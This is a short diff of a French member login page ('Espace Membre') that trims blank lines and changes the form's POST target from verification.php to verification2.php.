@@ -1,4 +1,3 @@
-          
 
 <html lang="fr" class="translated-ltr"><head>
 	<title>Espcace Membre connexion</title>
@@ -31,7 +30,7 @@
 	<div class="limiter">
 		<div class="container-login100">
 			<div class="wrap-login100 p-l-85 p-r-85 p-t-55 p-b-55">
-                            <form class="login100-form validate-form flex-sb flex-w" action="verification.php" method="POST">
+                            <form class="login100-form validate-form flex-sb flex-w" action="verification2.php" method="POST">
 					<span class="login100-form-title p-b-32"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                                Espace Membre
 					 </font></font></span>
@@ -54,7 +53,7 @@
                                             <input class="input100" type="password" name="password" required>
 						<span class="focus-input100"></span>
 					</div>
-                             
+                                
       		
 					<div class="flex-sb-m w-full p-b-48">
 						<div class="contact100-form-checkbox">
@@ -109,6 +108,3 @@
 
 
 <div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>
-
-
-
